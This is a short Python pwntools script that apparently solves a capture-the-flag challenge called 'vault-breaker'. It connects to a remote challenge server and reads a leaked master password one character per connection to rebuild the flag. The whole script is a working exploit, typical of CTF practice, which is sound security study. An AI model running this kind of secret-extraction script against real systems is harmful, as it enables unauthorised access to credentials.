from pwn import *

def f(index):
    io = process("./vault-breaker")
    io = remote("94.237.62.252", 48071)
    io.sendlineafter("> ", b"1")

    io.sendlineafter(": ", f"{index}".encode())
    #io.close()

    io.sendlineafter("> ", b"2")
    
    #print(io.recv(1024))
    
    #io.close()

    io.recvuntil(b"Master password for Vault: ")

    res = chr(io.recvline()[index])

    io.close()

    return res

flag = str()

for i in range(25):
    try:
        flag += f(i)
        print(flag)
    except:
        pass

print(flag)
    
